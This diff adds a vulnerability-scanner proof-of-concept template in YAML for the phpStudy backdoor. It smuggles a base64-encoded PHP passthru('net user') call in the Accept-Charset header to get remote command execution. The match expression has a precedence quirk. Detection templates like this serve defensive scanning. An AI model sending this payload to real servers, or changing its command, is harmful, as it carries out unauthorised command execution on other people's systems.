@@ -1,0 +1,16 @@
+name: poc-yaml-phpstudybackdoor.yml
+rules:
+  - method: GET
+    path: /
+    headers: 
+      Accept-Encoding: gzip,deflate
+      Accept-Charset: ZWNobyBwYXNzdGhydSgibmV0IHVzZXIiKTs=
+    follow_redirects: false
+    expression: |
+      response.status==200 && response.body.bcontains(b'Administrator') || response.body.bcontains(b'Guest')
+
+detail:
+  VulnType: "command exec"
+  author: phpStudy20180211 or phpStudy20161103
+  links: 
+    - https://www.freebuf.com/articles/others-articles/215406.html
